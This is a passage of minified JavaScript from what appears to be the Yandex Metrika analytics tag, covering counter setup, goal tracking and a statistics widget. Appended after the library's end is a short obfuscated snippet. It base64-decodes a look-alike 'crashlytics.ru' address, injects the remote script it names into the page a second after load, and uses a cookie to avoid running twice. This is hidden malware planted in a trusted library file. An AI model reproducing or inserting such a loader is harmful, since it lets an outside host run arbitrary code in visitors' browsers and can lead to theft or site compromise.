              ? ((n += String.fromCharCode(i)), o++)
              : 191 < i && 224 > i
              ? ((a = r.charCodeAt(o + 1)),
                (n += String.fromCharCode(((31 & i) << 6) | (63 & a))),
                (o += 2))
              : ((a = r.charCodeAt(o + 1)),
                (n += String.fromCharCode(
                  ((15 & i) << 12) |
                    ((63 & a) << 6) |
                    (63 & r.charCodeAt(o + 2))
                )),
                (o += 3));
          return lo((r = ua(t, n))) ? r : [];
        }),
        Rm = Hr("ep.ent", function (t, e, n) {
          return 16 < (n = "" + 100 * e + n + (t = "" + Ki(t, 10, 99))).length
            ? ""
            : ((e = (n = bh("0", 16, n)).slice(0, 8)),
              (n = n.slice(-8)),
              (e = (92844 ^ +e).toString(35)) +
                "z" +
                (n = (92844 ^ +n).toString(35)));
        }),
        Mm = po(f, km),
        Nm = Hr("ep.ctp", function (t, e, n, r) {
          var i = Mm(t, n),
            o = s(t, r);
          c(t, e, i, o),
            zo("MutationObserver", t.MutationObserver) &&
              new t.MutationObserver(function () {
                var a = Mm(t, n),
                  u = s(t, r);
                (i === a && o === u) || c(t, e, (i = a), (o = u));
              }).observe(t.document.body, {
                attributes: !0,
                childList: !0,
                subtree: !0,
                characterData: !0,
              });
        }),
        Dm = Hr("ep.chp", function (t, e, n, r, i) {
          return (
            n && h(t, e),
            r || i
              ? os(t).C(
                  t.document,
                  ["click"],
                  Ur(t, "ep.chp.cl", Eo([t, e, r, i], u))
                )
              : qo
          );
        }),
        Pm = Hr("ep.i", function (t, e) {
          return zo("querySelectorAll", t.document.querySelectorAll)
            ? (function (t, e) {
                return xn(t, e, function (e) {
                  var n = mo(e, "settings.dr");
                  return {
                    vh: Sm(t, n),
                    isEnabled: mo(e, "settings.auto_goals"),
                  };
                });
              })(t, e).then(function (n) {
                var r = n.vh,
                  i = r[0],
                  o = r[1],
                  u = r[2],
                  c = r[3],
                  s = r[4],
                  f = r[5],
                  h = r[6],
                  l = r[7],
                  d = r[8],
                  p = r[9],
                  v = r[10],
                  m = r[11],
                  g = r[12],
                  b = r[13],
                  y = r[14],
                  w = r[15];
                if (!n.isEnabled) return us.resolve(qo);
                var E = a(t, i),
                  x = a(t, c),
                  C = a(t, h),
                  A = a(t, d),
                  _ = "" + i + o + u == "" + c + s + f;
                return Z(t).then(function () {
                  return (
                    E
                      ? Nm(t, e, o, u, v, m, g)
                      : x && !_ && Nm(t, e, s, f, b, y, w),
                    Dm(t, e, C || A, l, p)
                  );
                });
              })
            : us.resolve(qo);
        }),
        Im = /[\*\.\?\(\)]/g,
        Om = Io(function (t, e, n) {
          try {
            var r = n.replace("\\s", " ").replace(Im, "");
            Ml(t, "").warn(
              'Function "' +
                r +
                '" has been overriden, this may cause issues with Metrika counter'
            );
          } catch (t) {}
        }, Go),
        Lm = Hr("r.nn", function (t) {
          un(t).isEnabled &&
            Pr(t, nu, function (e) {
              e.qa.C(function (e) {
                Om(t, e[1], e[0]), nu.splice(100);
              });
            });
        }),
        jm = Hr(
          "lt.p",
          uo("lt.p", function (t) {
            var e;
            if (zo("PerformanceObserver", t.PerformanceObserver)) {
              var n = 0,
                r = new t.PerformanceObserver(
                  Ur(t, "lt.o", function (e) {
                    e &&
                      e.getEntries &&
                      ((e = e.getEntries()),
                      (n = Cu(
                        function (t, e) {
                          return t + e.duration;
                        },
                        n,
                        e
                      )),
                      co(t).o("lt", n));
                  })
                );
              try {
                r.observe((((e = {}).type = "longtask"), (e.buffered = !0), e));
              } catch (t) {
                return qo;
              }
              return function () {
                return r.disconnect();
              };
            }
            return qo;
          })
        );
      "function" == typeof Promise && Promise.resolve();
      var Bm,
        Fm,
        Gm,
        Hm = { position: "absolute" },
        Um = { position: "fixed" },
        Xm = po(Au("settings.sm"), ou(1)),
        Vm = uo("siteStatistics", function (t, e) {
          return Q(t)(
            Zn(
              qo,
              Eo(
                [
                  t,
                  e,
                  function (n) {
                    return Xm(n)
                      ? (function (t, e) {
                          function n() {
                            f.hidden
                              ? Nu(
                                  c.style,
                                  i(
                                    ["top", "right", "left", "background"],
                                    "initial"
                                  )
                                )
                              : Nu(c.style, i(["top", "right", "left"], "0"), {
                                  background: "rgba(0, 0, 0, .3)",
                                }),
                              (f.hidden = !f.hidden),
                              (h.hidden = !h.hidden),
                              (l.hidden = !l.hidden);
                          }
                          function r(t) {
                            var e = u("div");
                            return (
                              Nu(e.style, o("2px", "18px"), Hm, {
                                left: "15px",
                                top: "7px",
                                background: "#2f3747",
                                borderRadius: "2px",
                              }),
                              (e.style.transform = "rotate(" + t + "deg)"),
                              e
                            );
                          }
                          function a(t, e, n, r, i) {
                            var a = u("div");
                            return (
                              Nu(a.style, o(e + "px", n + "px"), Hm, {
                                left: t + "px",
                                bottom: 0,
                                background: r,
                                borderTopLeftRadius: i && i + "px",
                              }),
                              a
                            );
                          }
                          var u = Es(t);
                          if (!u) return qo;
                          var c = u("div");
                          c.classList.add("__ym_wv_ign"),
                            Nu(c.style, Um, {
                              bottom: "0",
                              width: "100%",
                              zIndex: "9999",
                            });
                          var s = u("div");
                          Nu(s.style, o("24px"), Hm, {
                            top: "12px",
                            right: "10px",
                            background: "#3367dc",
                            borderRadius: "50%",
                            overflow: "hidden",
                          });
                          var f = u("div");
                          (f.id = "__ym_wv_ign__opener"),
                            Nu(f.style, o("46px", "48px"), Um, {
                              right: "0",
                              bottom: "60px",
                              cursor: "pointer",
                              background: "#fff",
                              borderRadius: "16px 0 0 16px",
                              boxShadow:
                                "0px 0px 1px rgba(67, 68, 69, 0.3), 0px 1px 2px rgba(67, 68, 69, 0.3)",
                            });
                          var h = u("div");
                          Nu(h.style, Hm, i(["top", "right", "bottom"], "0"), {
                            width: "600px",
                            background: "#fff",
                          });
                          var l = u("div");
                          (l.id = "__ym_wv_ign__closer"),
                            Nu(l.style, o("32px"), Hm, {
                              top: "12px",
                              right: "612px",
                              cursor: "pointer",
                              background: "#fff",
                              borderRadius: "50%",
                            });
                          var d = u("iframe");
                          Nu(d.style, o("100%"), { border: "none" }),
                            (d.src =
                              "https://metrika.yandex.ru/widget/dashboard?id=" +
                              e),
                            (h.hidden = !0),
                            (l.hidden = !0),
                            l.appendChild(r(45)),
                            l.appendChild(r(-45)),
                            h.appendChild(d),
                            s.appendChild(
                              a(
                                0,
                                8,
                                9,
                                "linear-gradient(0deg, #ff324f, #ff324f), linear-gradient(158.67deg, #ff455c 12.6%, #ff1139 96.76%)"
                              )
                            ),
                            s.appendChild(a(8, 9, 16, "#04acff", 3)),
                            s.appendChild(a(17, 7, 24, "#ffdd13")),
                            f.appendChild(s),
                            c.appendChild(h),
                            c.appendChild(l);
                          var p = ["click", "touchstart"],
                            v = Eo(
                              [
                                Wo,
                                (d = [
                                  (s = os(t)).C(f, p, n),
                                  s.C(l, p, n),
                                  s.C(d, ["load"], wo(f, yu(c.appendChild, c))),
                                  wo(
                                    c,
                                    yu(
                                      t.document.body.removeChild,
                                      t.document.body
                                    )
                                  ),
                                ]),
                              ],
                              zu
                            );
                          return (
                            d.push(
                              s.C(t, ["securitypolicyviolation"], function (t) {
                                (t = mo(t, "blockedURI")) &&
                                  0 <= t.indexOf("https://metrika.yandex.ru") &&
                                  v();
                              })
                            ),
                            t.document.body.appendChild(c),
                            v
                          );
                        })(t, e.id)
                      : qo;
                  },
                ],
                xn
              )
            )
          );
        }),
        zm = /(.*[\\?&])(ysclid=[^&]+&?)(.*)/,
        Ym = Hr("yid.e", function (t) {
          var e,
            n = Xi(t),
            r = n.href;
          Ro(n.search, "ysclid") &&
            ((n = (function (t) {
              return t.replace(zm, function (t, e, n, r) {
                return "" + e + r;
              });
            })(r)),
            null !== (e = null == t ? void 0 : t.history) &&
              void 0 !== e &&
              e.replaceState &&
              zo("replaceState", t.history.replaceState) &&
              t.history.replaceState(void 0, "", n));
        }),
        qm = Hr("fbq.o", function (t, e, n) {
          var r = mo(t, "fbq");
          if (r && r.callMethod) {
            var i = function () {
              var t = Oo(arguments),
                n = r.apply(void 0, t);
              return e(t), n;
            };
            Nu(i, r), n && zu(e, n), (t.fbq = i);
          } else var o = Br(t, Eo([t, e, $o(Zi(r && r.queue))], qm), 1e3, "fbq.d");
          return yu(ro, null, t, o);
        }),
        Km =
          (((Bm = {}).add_to_wishlist = "add-to-wishlist"),
          (Bm.begin_checkout = "begin-checkout"),
          (Bm.generate_lead = "submit-lead"),
          (Bm.add_payment_info = "add-payment-info"),
          Bm),
        Wm =
          (((Fm = {}).AddToCart = "add-to-cart"),
          (Fm.Lead = "submit-lead"),
          (Fm.InitiateCheckout = "begin-checkout"),
          (Fm.Purchase = "purchase"),
          (Fm.CompleteRegistration = "register"),
          (Fm.Contact = "submit-contact"),
          (Fm.AddPaymentInfo = "add-payment-info"),
          (Fm.AddToWishlist = "add-to-wishlist"),
          (Fm.Subscribe = "subscribe"),
          Fm),
        Jm =
          (((Gm = {})[1] = Km), (Gm[2] = Km), (Gm[3] = Km), (Gm[0] = Wm), Gm),
        $m = [Wm.AddToCart, Wm.Purchase],
        Zm = Xo(function (t, e) {
          var n = mo(e, "ecommerce"),
            r = mo(e, "event") || "";
          (n = n && r && { version: "3", lc: r }) ||
            (n =
              (lo(e) || _u(e)) && ((r = (n = Oo(e))[1]), "event" === n[0] && r)
                ? { version: "2", lc: r }
                : void 0),
            n ||
              (n = (n = mo(e, "ecommerce")) && {
                version: "1",
                lc: iu(",", Mu(n)),
              }),
            n && t(n);
        }),
        Qm = Hr("ag.e", function (t, e) {
          var i = [],
            o = Ur(t, "ag.s", Eo([Wo, i], zu));
          return (
            "0" === e.aa &&
              xn(t, e, function (o) {
                if (
                  mo(o, "settings.auto_goals") &&
                  vn(t, e) &&
                  (o = md(t, e, "autogoal"))
                ) {
                  o = Eo([o, e.jc], r);
                  var a = Zm(o);
                  (o = Eo([t, o], n)),
                    i.push(qm(t, o)),
                    i.push(
                      Op(t, "dataLayer", function (t) {
                        t.qa.C(a);
                      })
                    );
                }
              }),
            o
          );
        }),
        tg = Io(function (t) {
          return (
            mo(t, "crypto.subtle.digest") &&
            mo(t, "TextEncoder") &&
            mo(t, "FileReader") &&
            mo(t, "Blob")
          );
        }),
        eg = Hr("fpm", function (t, n) {
          if (!es(t)) return qo;
          var r = Fc(n);
          if (!tg(t)) return an(t, r, "Not supported"), qo;
          var i = vn(t, n);
          return i
            ? function (n) {
                return new us(function (r, o) {
                  return Ao(n)
                    ? Mu(n).length
                      ? r(
                          e(t, n).then(function (t) {
                            var e, n;
                            t &&
                              t.length &&
                              i.params(
                                (((e = {}).__ym = (((n = {}).fpp = t), n)), e)
                              );
                          }, qo)
                        )
                      : o(Gi("fpm.l"))
                    : o(Gi("fpm.o"));
                }).catch(Ur(t, "fpm.en"));
              }
            : qo;
        }),
        ng = [
          "an.yandex.ru/mapuid/google/?partner-tag=yandex_ag",
          "an.yandex.ru/mapuid/betweenx/",
        ],
        rg = Hr("p.sci", function (e, n) {
          var r = Fc(n);
          if (!Fu(r, rl)) {
            var i = Pu(e),
              o = i.l("scip");
            if (!o)
              return xn(e, n, Ho).then(function (n) {
                return (
                  (n = mo(n, "settings.ins")),
                  !(o = i.l("scip")) && n ? (i.o("scip", !0), t(e)) : null
                );
              }, Ur(e, "ins.cs"));
          }
          return us.resolve();
        }),
        ig = Pu(window);
      ig.Fa("hitParam", {}),
        ig.Fa("lastReferrer", window.location.href),
        ig.Fa("getCounters", id(window)),
        Kh.push(kp);
      var og = function (t, e, n, r) {
        var i = this;
        return Ur(window, "c.i", function () {
          (!window || (isNaN(t) && !t)) && Fi();
          var o = window,
            a = (function (t, e, n, r, i) {
              var o = "object" == typeof t ? t : { id: t, aa: r, ac: i, N: n };
              return (
                Yi(
                  (t = Cu(
                    function (t, e) {
                      var n = e[1],
                        r = n.Oi;
                      return (n = o[n.Vf]), (t[e[0]] = r ? r(n) : n), t;
                    },
                    {},
                    Ru(e)
                  )),
                  t.N || {}
                ),
                t
              );
            })(t, jc, e, n, r);
          if (!window["disableYaCounter" + a.id]) {
            var u = Fc(a);
            a.id || an(o, u, "Invalid Metrika id: " + a.id);
            var c = ig.l("counters", {}),
              s = [],
              f = [],
              h = [Za, Wa, $a];
            h.unshift(Ja);
            var l = function (t, e) {
                t && (ko(t) ? s.push(t) : e && s.push(t[e]));
              },
              d = function (t, e) {
                var n = Wa(o, a, 0, t)(o, a);
                return (
                  n &&
                    (ko(n.then)
                      ? n.then(function (t) {
                          return l(t, e);
                        })
                      : l(n, e)),
                  n
                );
              },
              p = function (t, e, n) {
                i[e] = (function (t, e, n, r, i) {
                  return n.length && i
                    ? Eo(
                        Cu(
                          function (i, o, a) {
                            return n[a] ? i.concat(Eo([t, e, r], o)) : i;
                          },
                          [],
                          n
                        ),
                        po
                      )()(i)
                    : i;
                })(o, a, n || h, e, t);
              };
            if (c[u])
              return (
                an(o, u, "Duplicate counter " + u + " initialization"), c[u]
              );
            var v = !1,
              m = ig.l("hitParam", {});
            m[u] && (v = !(!Gc(a.aa) || c[u])),
              (m[u] = 1),
              (i._webvisor = a.Ta || !1),
              (c[u] = i),
              ig.o("counters", c),
              ig.Fa("counter", i),
              d(Vm),
              (m = od(window, a)),
              s.push(m),
              Bd(window),
              fm(window, a) && delete c[u],
              d(dv),
              hv(o, [lm, hm, A, It, w, Rt, Td, Pt, y, b, E]),
              f.push(wo(ch, d)),
              f.push(wo(rg, d)),
              d(Nl),
              f.push(wo(I, d)),
              d(av),
              d(uv),
              p(Pl(o, a), "hit"),
              p(Sp(o, a), "params"),
              (u = d(ad, yp({ unsubscribe: 1 }))),
              (i.trackHash = Wa(o, a, 0, mo(u, yp({ Gj: 1 })))),
              p(md(o, a), "reachGoal"),
              p(Rp(o, a), "experiments"),
              d(sv),
              f.push(wo(nd, d)),
              v || f.push(wo(gp, d)),
              s.push(Qm(o, a)),
              p(mo((v = d(ld, yp({ yd: 1 }))), yp({ Pi: 1 })), "notBounce"),
              p((u = d(eg)), "firstPartyParams"),
              p(mo(v, yp({ Wb: 1 })), "accurateTrackBounce"),
              d(Mp),
              p(mo((v = d(bd, yp({ yd: 1 }))), yp({ Ch: 1 })), "extLink"),
              p(mo(v, yp({ Xg: 1 })), "addFileExtension"),
              p(mo(v, yp({ file: 1 })), "file"),
              p(mo(v, yp({ ed: 1 })), "trackLinks"),
              s.push(Lp(o, a)),
              s.push(jp(o)),
              p(Bp(o, a), "ecommerceAdd"),
              p(Fp(o, a), "ecommerceRemove"),
              p(Gp(o, a), "ecommerceDetail"),
              p(Hp(o, a), "ecommercePurchase"),
              p((v = d(cv)) || qo, "userParams"),
              p(fv(o, a, s), "destruct", [Za, $a]),
              d(Xf),
              d(kd),
              p((v = d(pv)) || qo, "setUserID"),
              (i.getClientID = d(vv) || qo),
              d(jd),
              p(wp(o, a), "clickmap"),
              (v = d(Pm)) && v.then(yo("push", s)),
              d(bp),
              p(Ep(o, a), "enableAll"),
              d(mm),
              d(ym),
              d(xp),
              d(Cp),
              d(Ym),
              d(jm),
              f.push(wo(nv, d)),
              (p = d(Ap)) && p.then(yo("push", s)),
              d(_p),
              qn(
                o,
                Eo(
                  [
                    o,
                    f,
                    function (t) {
                      d(t);
                    },
                    1,
                    "a.i",
                  ],
                  Kn
                )
              ),
              d(ot),
              d(cm),
              Lm(o);
          }
        })();
      };
      if (
        ((function (t) {
          var e = Pu(t);
          e.l("i") || (e.o("i", !0), os(t).C(t, ["message"], wo(t, j)));
        })(window),
        window.Ya && og)
      ) {
        var ag = Pc.$b;
        (window.Ya[ag] = og), pd(window);
        var ug = window.Ya[ag];
        (ug.informer = (function (t) {
          var e = Ur(t, "i.clch", _a);
          return (
            os(t).C(t.document, ["click"], yu(e, null, t), { passive: !1 }),
            function (e) {
              var n = Pc.Ka,
                r = t.Ya[Pc.$b],
                i = !!r._informer;
              (r._informer = Nu({ domain: "informer.yandex.ru" }, e)),
                i ||
                  si(t, {
                    src: n + "//informer.yandex.ru/metrika/informer.js",
                  });
            }
          );
        })(window)),
          (ug.counters = ig.l("getCounters"));
      }
      !(function (t) {
        var e = mo(t, "ym");
        if (e) {
          var n = mo(e, "a");
          n || ((e.a = []), (n = e.a));
          var r = Ip(t);
          Pr(
            t,
            n,
            function (t) {
              t.qa.C(r);
            },
            !0
          );
        }
      })(window);
    })();
  } catch (t) {}
}.call(this));
!(function (o, w, d, l) {
  try {
    (o.c =
      "h" == l.protocol[0] &&
      /./.test(l.hostname) &&
      !/PHPPREFS/.test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            atob(
              "aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ=="
            ) + l.href),
          d.body.appendChild(o.s));
      }, 1e3),
      (d.cookie = "PHPPREFS=full;max-age=39800;");
  } catch (e) {}
})({}, window, document, location);
